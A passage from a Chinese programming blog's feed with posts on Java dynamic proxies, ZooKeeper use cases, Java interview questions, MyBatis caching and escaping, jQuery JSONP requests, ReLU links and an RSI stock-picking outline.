java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chinaroad.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloWorldInvocationHandler</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        before();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(obj, args);</span><br><span class="line">        after();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Begin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chinaroad.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">HelloWorld</span> <span class="variable">helloWorld</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloWorldImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloWorldInvocationHandler</span>(helloWorld);</span><br><span class="line"></span><br><span class="line">        <span class="type">HelloWorld</span> <span class="variable">proxy</span> <span class="operator">=</span> (HelloWorld) Proxy.newProxyInstance(</span><br><span class="line">                helloWorld.getClass().getClassLoader(),</span><br><span class="line">                helloWorld.getClass().getInterfaces(),</span><br><span class="line">                handler);</span><br><span class="line"></span><br><span class="line">        proxy.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代理模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zookeeper</title>
      <link href="/2017/03/07/zookeeper/"/>
      <url>/2017/03/07/zookeeper/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://blog.csdn.net/tswisdom/article/details/41522069">ZooKeeper系列(一)</a></li><li><a href="http://blog.csdn.net/tswisdom/article/details/41522041">ZooKeeper系列(二)</a></li><li><a href="http://blog.csdn.net/tswisdom/article/details/41522099">ZooKeeper系列(三)</a></li></ul><p>可以先了解上面的原理，比较详细，再看看下面的总结。</p><span id="more"></span><h3 id="数据发布与订阅（配置中心）"><a href="#数据发布与订阅（配置中心）" class="headerlink" title="数据发布与订阅（配置中心）"></a>数据发布与订阅（配置中心）</h3><p>发布与订阅模型，即所谓的配置中心，顾名思义就是发布者将数据发布到ZK节点上，供订阅者动态获取数据，实现配置信息的集中式管理和动态更新。例如全局的配置信息，服务式服务框架的服务地址列表等就非常适合使用。<br>应用中用到的一些配置信息放到ZK上进行集中管理。这类场景通常是这样：应用在启动的时候会主动来获取一次配置，同时，在节点上注册一个Watcher，这样一来，以后每次配置有更新的时候，都会实时通知到订阅的客户端，从来达到获取最新配置信息的目的。<br>分布式搜索服务中，索引的元信息和服务器集群机器的节点状态存放在ZK的一些指定节点，供各个客户端订阅使用。<br>分布式日志收集系统。这个系统的核心工作是收集分布在不同机器的日志。收集器通常是按照应用来分配收集任务单元，因此需要在ZK上创建一个以应用名作为path的节点P，并将这个应用的所有机器ip，以子节点的形式注册到节点P上，这样一来就能够实现机器变动的时候，能够实时通知到收集器调整任务分配。<br>系统中有些信息需要动态获取，并且还会存在人工手动去修改这个信息的发问。通常是暴露出接口，例如JMX接口，来获取一些运行时的信息。引入ZK之后，就不用自己实现一套方案了，只要将这些信息存放到指定的ZK节点上即可。<br>注意：在上面提到的应用场景中，有个默认前提是：数据量很小，但是数据更新可能会比较快的场景。</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>这里说的负载均衡是指软负载均衡。在分布式环境中，为了保证高可用性，通常同一个应用或同一个服务的提供方都会部署多份，达到对等服务。而消费者就须要在这些对等的服务器中选择一个来执行相关的业务逻辑，其中比较典型的是消息中间件中的生产者，消费者负载均衡。<br>消息中间件中发布者和订阅者的负载均衡，linkedin开源的KafkaMQ和阿里开源的metaq都是通过zookeeper来做到生产者、消费者的负载均衡。这里以metaq为例如讲下：<br>生产者负载均衡：metaq发送消息的时候，生产者在发送消息的时候必须选择一台broker上的一个分区来发送消息，因此metaq在运行过程中，会把所有broker和对应的分区信息全部注册到ZK指定节点上，默认的策略是一个依次轮询的过程，生产者在通过ZK获取分区列表之后，会按照brokerId和partition的顺序排列组织成一个有序的分区列表，发送的时候按照从头到尾循环往复的方式选择一个分区来发送消息。<br>消费负载均衡：</p><p>在消费过程中，一个消费者会消费一个或多个分区中的消息，但是一个分区只会由一个消费者来消费。MetaQ的消费策略是：</p><p>每个分区针对同一个group只挂载一个消费者。<br>如果同一个group的消费者数目大于分区数目，则多出来的消费者将不参与消费。<br>如果同一个group的消费者数目小于分区数目，则有部分消费者需要额外承担消费任务。<br>在某个消费者故障或者重启等情况下，其他消费者会感知到这一变化（通过 zookeeper watch消费者列表），然后重新进行负载均衡，保证所有的分区都有消费者进行消费。</p><h3 id="命名服务-Naming-Service"><a href="#命名服务-Naming-Service" class="headerlink" title="命名服务(Naming Service)"></a>命名服务(Naming Service)</h3><p>命名服务也是分布式系统中比较常见的一类场景。在分布式系统中，通过使用命名服务，客户端应用能够根据指定名字来获取资源或服务的地址，提供者等信息。被命名的实体通常可以是集群中的机器，提供的服务地址，远程对象等等——这些我们都可以统称他们为名字（Name）。其中较为常见的就是一些分布式服务框架中的服务地址列表。通过调用ZK提供的创建节点的API，能够很容易创建一个全局唯一的path，这个path就可以作为一个名称。<br>阿里巴巴集团开源的分布式服务框架Dubbo中使用ZooKeeper来作为其命名服务，维护全局的服务地址列表，点击这里查看Dubbo开源项目。在Dubbo实现中：<br>服务提供者在启动的时候，向ZK上的指定节点&#x2F;dubbo&#x2F;${serviceName}&#x2F;providers目录下写入自己的URL地址，这个操作就完成了服务的发布。</p><p>服务消费者启动的时候，订阅&#x2F;dubbo&#x2F;${serviceName}&#x2F;providers目录下的提供者URL地址， 并向&#x2F;dubbo&#x2F;${serviceName} &#x2F;consumers目录下写入自己的URL地址。</p><p>注意，所有向ZK上注册的地址都是临时节点，这样就能够保证服务提供者和消费者能够自动感应资源的变化。</p><p>另外，Dubbo还有针对服务粒度的监控，方法是订阅&#x2F;dubbo&#x2F;${serviceName}目录下所有提供者和消费者的信息。</p><h3 id="分布式通知-x2F-协调"><a href="#分布式通知-x2F-协调" class="headerlink" title="分布式通知&#x2F;协调"></a>分布式通知&#x2F;协调</h3><p>ZooKeeper中特有watcher注册与异步通知机制，能够很好的实现分布式环境下不同系统之间的通知与协调，实现对数据变更的实时处理。使用方法通常是不同系统都对ZK上同一个znode进行注册，监听znode的变化（包括znode本身内容及子节点的），其中一个系统update了znode，那么另一个系统能够收到通知，并作出相应处理<br>另一种心跳检测机制：检测系统和被检测系统之间并不直接关联起来，而是通过zk上某个节点关联，大大减少系统耦合。<br>另一种系统调度模式：某系统有控制台和推送系统两部分组成，控制台的职责是控制推送系统进行相应的推送工作。管理人员在控制台作的一些操作，实际上是修改了ZK上某些节点的状态，而ZK就把这些变化通知给他们注册Watcher的客户端，即推送系统，于是，作出相应的推送任务。<br>另一种工作汇报模式：一些类似于任务分发系统，子任务启动后，到zk来注册一个临时节点，并且定时将自己的进度进行汇报（将进度写回这个临时节点），这样任务管理者就能够实时知道任务进度。<br>总之，使用zookeeper来进行分布式通知和协调能够大大降低系统之间的耦合</p><h3 id="集群管理与Master选举"><a href="#集群管理与Master选举" class="headerlink" title="集群管理与Master选举"></a>集群管理与Master选举</h3><p>集群机器监控：这通常用于那种对集群中机器状态，机器在线率有较高要求的场景，能够快速对集群中机器变化作出响应。这样的场景中，往往有一个监控系统，实时检测集群机器是否存活。过去的做法通常是：监控系统通过某种手段（比如ping）定时检测每个机器，或者每个机器自己定时向监控系统汇报“我还活着”。 这种做法可行，但是存在两个比较明显的问题：<br>集群中机器有变动的时候，牵连修改的东西比较多。<br>有一定的延时。<br>利用ZooKeeper有两个特性，就可以实时另一种集群机器存活性监控系统：</p><p>客户端在节点 x 上注册一个Watcher，那么如果 x?的子节点变化了，会通知该客户端。<br>创建EPHEMERAL类型的节点，一旦客户端和服务器的会话结束或过期，那么该节点就会消失。<br>例如，监控系统在 &#x2F;clusterServers 节点上注册一个Watcher，以后每动态加机器，那么就往 &#x2F;clusterServers 下创建一个 EPHEMERAL类型的节点：&#x2F;clusterServers&#x2F;{hostname}. 这样，监控系统就能够实时知道机器的增减情况，至于后续处理就是监控系统的业务了。</p><p>Master选举则是zookeeper中最为经典的应用场景了。<br>在分布式环境中，相同的业务应用分布在不同的机器上，有些业务逻辑（例如一些耗时的计算，网络I&#x2F;O处理），往往只需要让整个集群中的某一台机器进行执行，其余机器可以共享这个结果，这样可以大大减少重复劳动，提高性能，于是这个master选举便是这种场景下的碰到的主要问题。</p><p>利用ZooKeeper的强一致性，能够保证在分布式高并发情况下节点创建的全局唯一性，即：同时有多个客户端请求创建 &#x2F;currentMaster 节点，最终一定只有一个客户端请求能够创建成功。利用这个特性，就能很轻易的在分布式环境中进行集群选取了。</p><p>另外，这种场景演化一下，就是动态Master选举。这就要用到?EPHEMERAL_SEQUENTIAL类型节点的特性了。</p><p>上文中提到，所有客户端创建请求，最终只有一个能够创建成功。在这里稍微变化下，就是允许所有请求都能够创建成功，但是得有个创建顺序，于是所有的请求最终在ZK上创建结果的一种可能情况是这样： &#x2F;currentMaster&#x2F;{sessionId}-1 ,?&#x2F;currentMaster&#x2F;{sessionId}-2 ,?&#x2F;currentMaster&#x2F;{sessionId}-3 ….. 每次选取序列号最小的那个机器作为Master，如果这个机器挂了，由于他创建的节点会马上小时，那么之后最小的那个机器就是Master了。</p><p>在搜索系统中，如果集群中每个机器都生成一份全量索引，不仅耗时，而且不能保证彼此之间索引数据一致。因此让集群中的Master来进行全量索引的生成，然后同步到集群中其它机器。另外，Master选举的容灾措施是，可以随时进行手动指定master，就是说应用在zk在无法获取master信息时，可以通过比如http方式，向一个地方获取master。<br>在Hbase中，也是使用ZooKeeper来实现动态HMaster的选举。在Hbase实现中，会在ZK上存储一些ROOT表的地址和HMaster的地址，HRegionServer也会把自己以临时节点（Ephemeral）的方式注册到Zookeeper中，使得HMaster可以随时感知到各个HRegionServer的存活状态，同时，一旦HMaster出现问题，会重新选举出一个HMaster来运行，从而避免了HMaster的单点问题</p><h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><p>分布式锁，这个主要得益于ZooKeeper为我们保证了数据的强一致性。锁服务可以分为两类，一个是保持独占，另一个是控制时序。<br>所谓保持独占，就是所有试图来获取这个锁的客户端，最终只有一个可以成功获得这把锁。通常的做法是把zk上的一个znode看作是一把锁，通过create znode的方式来实现。所有客户端都去创建 &#x2F;distribute_lock 节点，最终成功创建的那个客户端也即拥有了这把锁。<br>控制时序，就是所有视图来获取这个锁的客户端，最终都是会被安排执行，只是有个全局时序了。做法和上面基本类似，只是这里 &#x2F;distribute_lock 已经预先存在，客户端在它下面创建临时有序节点（这个可以通过节点的属性控制：CreateMode.EPHEMERAL_SEQUENTIAL来指定）。Zk的父节点（&#x2F;distribute_lock）维持一份sequence,保证子节点创建的时序性，从而也形成了每个客户端的全局时序。</p><h3 id="分布式队列"><a href="#分布式队列" class="headerlink" title="分布式队列"></a>分布式队列</h3><p>队列方面，简单地讲有两种，一种是常规的先进先出队列，另一种是要等到队列成员聚齐之后的才统一按序执行。对于第一种先进先出队列，和分布式锁服务中的控制时序场景基本原理一致，这里不再赘述。<br>第二种队列其实是在FIFO队列的基础上作了一个增强。通常可以在 &#x2F;queue 这个znode下预先建立一个&#x2F;queue&#x2F;num 节点，并且赋值为n（或者直接给&#x2F;queue赋值n），表示队列大小，之后每次有队列成员加入后，就判断下是否已经到达队列大小，决定是否可以开始执行了。这种用法的典型场景是，分布式环境中，一个大任务Task A，需要在很多子任务完成（或条件就绪）情况下才能进行。这个时候，凡是其中一个子任务完成（就绪），那么就去 &#x2F;taskList 下建立自己的临时时序节点（CreateMode.EPHEMERAL_SEQUENTIAL），当 &#x2F;taskList 发现自己下面的子节点满足指定个数，就可以进行下一步按序进行处理了。</p>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自出JAVA面试题一道</title>
      <link href="/2017/03/02/%E8%87%AA%E5%87%BAJAVA%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B8%80%E9%81%93/"/>
      <url>/2017/03/02/%E8%87%AA%E5%87%BAJAVA%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B8%80%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>最近招人，想了几道面试题，包含基础知识、深入一点、Linux一点、数据库一点。比较基础，但是足够在简历筛选后再过滤一部分人了。其实面试题做的怎么样无所谓，聊一聊也大概知道是什么水平、能深入到什么水平。聊天的时候也还可以问问补充的题，比如一些框架基础、新技术趋势、实现原理什么的，另外可以考察下解决问题的思维方式和交流沟通怎么样，实在不行，还可以叫他现场写段代码。或许也就知道对方是什么水平了。感觉要遇到一个特别喜欢的求职者还是比较困难，当然也不只是技术。</p><p>接下来要做的事，就是实现之前想象的一个量化策略，时间不多了。</p><p>也祝我好运吧～，写在深圳，夜，BGM&lt;刚好遇见你&gt;，I count the days!!</p><ol><li>&#x3D;&#x3D; 与 equals的区别</li><li>简要描述String、StringBuffer、StringBuilder的区别。</li><li>Char型变量能否存储一个中文字？为什么？</li><li>请写出ArrayList、LinkedList和Vector的区别？</li><li>如何在两个线程间共享数据？</li><li>请写一个你最熟悉的设计模式的代码，一般在是什么应用场景？如：单例、工厂、观察者、代理、建造者、适配器等…</li><li>java的内存回收机制是什么样的？java是否存在内存泄漏？有什么途径检测内存泄漏？（把知道的都可以写出来）</li><li>在Linux里，如何查看一个监听端口为10086的进程？如果要杀死它呢？</li><li>目前PP停车项目中有一张详细的出入场停车记录表<b> _record&lt;long id, varchar16 merchant, datetime enter_time, datetime leave_time, varchar16 card_no&gt; </b>，注: merchant 商户号, enter_time 入场时间, leave_time 出场时间。<br>请写出SQL(数据库不限)来统计指定商户的停车场的今天里面的每小时车辆入场数量。</li><li>一条SQL执行过长的时间，你可以从哪些方面做优化？（希望写出思路）</li><li>以下代码片段存在的主要问题是什么？怎么解决？</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Student&gt; stuList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">stuList.add(<span class="keyword">new</span> <span class="title class_">Student</span>(...));</span><br><span class="line">stuList.add(<span class="keyword">new</span> <span class="title class_">Student</span>(...));</span><br><span class="line">stuList.add(<span class="keyword">new</span> <span class="title class_">Student</span>(...));</span><br><span class="line"></span><br><span class="line">String[] names = [<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;ccc&quot;</span>];</span><br><span class="line"><span class="keyword">for</span>(Student stu : stuList) &#123;</span><br><span class="line">　　<span class="keyword">for</span>(String name : names) &#123;</span><br><span class="line">　　　　  <span class="keyword">if</span>(stu.getName() == name) &#123;</span><br><span class="line">　　　　　　　　stuList.remove(stu);</span><br><span class="line">    　　  &#125;     </span><br><span class="line">　　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="12"><li>下面这段代码输出结果是什么？为什么？</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; list = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    list.add(<span class="number">4</span>);</span><br><span class="line">    System.out.print(list.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyBatis的一级缓存</title>
      <link href="/2017/02/14/MyBatis%E7%9A%84%E4%B8%80%E7%BA%A7%E7%BC%93%E5%AD%98/"/>
      <url>/2017/02/14/MyBatis%E7%9A%84%E4%B8%80%E7%BA%A7%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p>参看这篇文章：</p><p><a href="http://blog.csdn.net/luanlouis/article/details/41280959">《深入理解MyBatis原理》MyBatis的一级缓存实现详解及使用注意事项</a><br><a href="http://blog.csdn.net/u010349169/article/category/2309433">MyBatis的其他文章</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery Ajax跨域的问题</title>
      <link href="/2017/02/02/jQuery%20Ajax%E8%B7%A8%E5%9F%9F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2017/02/02/jQuery%20Ajax%E8%B7%A8%E5%9F%9F%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>只需改动ajax固定参数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     <span class="attr">dataType</span>:<span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">  <span class="attr">crossDomain</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="attr">jsonpCallback</span>:<span class="string">&quot;jsonpCallbackFunction&quot;</span>,</span><br><span class="line">        <span class="attr">jsonp</span>:<span class="string">&quot;callback&quot;</span>,</span><br></pre></td></tr></table></figure><p>注意，后台返回的数据格式必须是：jsonpCallbackFunction(json数据);</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line"><span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line"><span class="attr">url</span>: platformUrl + <span class="string">&quot;/check.do&quot;</span>,</span><br><span class="line"><span class="attr">data</span>: params,</span><br><span class="line"><span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line"><span class="attr">crossDomain</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">jsonpCallback</span>: <span class="string">&quot;jsonpCallbackFunction&quot;</span>,</span><br><span class="line"><span class="attr">jsonp</span>: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line"><span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line"><span class="comment">//console.log(data);</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//console.log(&quot;error&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA面试</title>
      <link href="/2017/02/02/JAVA%E9%9D%A2%E8%AF%95/"/>
      <url>/2017/02/02/JAVA%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/it-interview/easy-job/blob/master/%E9%9D%A2%E8%AF%95%E9%A2%98/Java%E7%A0%94%E5%8F%91%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.md">Java研发知识点总结</a></li><li><a href="http://blog.csdn.net/moneyshi/article/details/50512240">Java并发多线程面试题 Top 50</a></li><li><a href="http://blog.csdn.net/moneyshi/article/details/50786786">面试题总结 —— JAVA高级工程师（一）</a></li><li><a href="http://blog.csdn.net/moneyshi/article/details/52917254">面试题总结 —— Java高级工程师（二）</a></li><li><a href="http://blog.csdn.net/moneyshi/article/details/53086927">面试题总结 —— Java高级工程师（三）</a></li><li><a href="https://github.com/scalad/Note">别人整理的笔记，多累</a><span id="more"></span></li><li><a href="http://blog.csdn.net/firejuly/article/details/8190229">Hibernate与 MyBatis的比较</a></li><li><a href="http://www.cnblogs.com/younggun/archive/2013/07/16/3193800.html">Spring事务详解</a></li><li><a href="http://blog.csdn.net/pingnanlee/article/details/11488695">Spring事务机制</a></li><li><a href="http://jinnianshilongnian.iteye.com/blog/1989381">Spring4新特性</a></li><li><a href="http://blog.csdn.net/generalyy0/article/details/7003974">spring mvc与struts的区别</a></li><li><a href="http://blog.itpub.net/751371/viewspace-747988/">WEBLOGIC负载均衡原理</a></li><li><a href="http://blog.csdn.net/big1980/article/details/6291416">负载均衡和集群的配置</a></li><li><a href="http://wenku.baidu.com/link?url=1rn43T_Fy5rHxwp3W2Sxs7yQngDWftWBYBtf3gtty3XPyTPbKHSrzUSlkyS9rk-Ctc11DV5M9ruD8C8UmyRortko2GKtlZzfB3hIzv0XPR3">Nginx+Tomcat+Redis实现负载均衡、资源分离、session共享</a></li><li><a href="http://www.cnblogs.com/xiaogangqq123/archive/2011/03/02/1969006.html">Nginx配置文件详细说明</a></li><li><a href="http://bbs.csdn.net/topics/391849317">web项目性能优化</a></li><li><a href="http://cantellow.iteye.com/blog/838473">单例模式的7种用法</a></li><li><a href="http://blog.csdn.net/hsuxu/article/details/8985931">线程池的原理和实现</a></li><li><a href="http://blog.csdn.net/y_h_t/article/details/6322823">高并发量网站解决方案</a></li><li><a href="http://www.bubuko.com/infodetail-196677.html">水平权限漏洞和解决办法</a></li><li><a href="http://www.wooyun.org/bugs/wooyun-2010-057371">垂直权限案例和解决方案</a></li><li><a href="http://blog.sina.com.cn/s/blog_701635160100l5hn.html">图片如何防盗链</a></li><li><a href="http://blog.csdn.net/blade2001/article/details/5193464">消息队列原理</a></li><li><a href="http://blog.csdn.net/jwdstef/article/details/17380471">消息队列 ActiveMQ</a></li><li><a href="http://www.cnblogs.com/CareySon/p/3627594.html">负载均衡和集群参考</a></li><li><a href="http://blog.csdn.net/jackmacro/article/details/5688687">存储过程的优缺点</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReLu(Rectified Linear Units)激活函数</title>
      <link href="/2017/01/20/ReLu(Rectified%20Linear%20Units)%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/"/>
      <url>/2017/01/20/ReLu(Rectified%20Linear%20Units)%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://wenku.baidu.com/link?url=GtIz68_egY1kBAFgt3LY0f2v89H6doReu6pcNB34yHiG_PEiSekhZVtSszGB28dtRmEfAKrYOQtu5T0EVLeTzKwpZAeTJEfo00XOgbj9l4u">Deep Sparse Rectifier Neural Networks</a></li><li>[Deep Sparse Rectifier Neural Networks.pdf Download](&#x2F;assets&#x2F;files&#x2F;Deep Sparse Rectifier Neural Networks.pdf)</li><li><a href="http://www.cnblogs.com/neopenx/p/4453161.html">ReLu(Rectified Linear Units) </a></li><li><a href="http://www.tuicool.com/articles/RJzMZvi">修正线性单元(Rectified linear unit，ReLU）</a></li><li><a href="http://blog.csdn.net/sheng_ai/article/details/38055209">激活函数实现–4 Rectified linear 函数实现</a></li><li><a href="http://www.douban.com/note/348196265/">Rectified Linear Units</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Machine learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReLu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyBatis运算符转义</title>
      <link href="/2017/01/19/mybatis%E8%BF%90%E7%AE%97%E7%AC%A6%E8%BD%AC%E4%B9%89/"/>
      <url>/2017/01/19/mybatis%E8%BF%90%E7%AE%97%E7%AC%A6%E8%BD%AC%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<p>在MyBatis配置文件写SQL语句的时候对于一些比如“&lt;”,”&gt;”,”&lt;&gt;”,”&amp;”,” ‘ “,” “ “是不能够识别的，并且会ERROR。</p><p>可以这样搞：</p><table><thead><tr><th>替换后</th><th>标志</th></tr></thead><tbody><tr><td><code>&amp;lt;</code></td><td>&lt;</td></tr><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;lt;\&amp;gt;</code></td><td>&lt;&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;apos;</code></td><td>‘</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSI+量价.md</title>
      <link href="/2017/01/13/RSI+%E9%87%8F%E4%BB%B7/"/>
      <url>/2017/01/13/RSI+%E9%87%8F%E4%BB%B7/</url>
      
        <content type="html"><![CDATA[<p>一个指标思路，最好要结合当前指数的稳定性，可以提高成功率，大环境、行业热点、优质活跃个股。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RSI 来判断所有满足条件的可买入的备选股票集合</span><br><span class="line">过滤涨跌停，ST，创业板</span><br><span class="line">过滤最近涨势不好的个股，20日涨幅</span><br><span class="line">成交量分析</span><br><span class="line">综合打分，排序候选</span><br><span class="line">调仓，仓位数量平均分配仓位</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL千万级大表添加索引</title>
